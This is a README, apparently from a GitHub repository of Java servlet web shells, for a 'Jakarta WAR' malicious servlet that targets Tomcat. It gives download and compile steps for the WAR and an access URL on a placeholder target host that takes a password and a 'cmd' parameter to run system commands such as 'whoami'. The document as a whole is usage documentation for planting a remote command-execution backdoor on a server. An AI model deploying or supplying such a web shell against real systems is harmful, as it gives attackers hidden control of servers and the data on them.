# Jakarta WAR

## Tested on:

- Tomcat

## Description

JSP-less servlet based on the "jakarta.servlet.*" classes.

## Usage

Get precompiled WAR from [Releases](https://github.com/mbadanoiu/Java-Servlets-Shell/releases).

OR

### Compile for Java Target 1.5
Requires JDK versions >=1.5 and <=1.8

Command:
```
bash compile_war_1.5.sh
```

### Compile for Java Target 1.7
Requires JDK >=11

Command:
```
bash compile_war_1.7.sh
```

### Access WAR
Once uploaded the servlet should be accessible via a URL simmilar to:
```
http(s)://<<TARGET>>/<<DEPLOY_PATH>>/mal_jakarta?pass=<<PASSWORD>>&cmd=whoami
```
**Note 1**: Usually the "\<\<DEPLOY_PATH\>\>" is "mal_tomcat".

**Note 2**: Replace "\<\<PASSWORD\>\>" in the request with the the password you have set up during the compilation step.
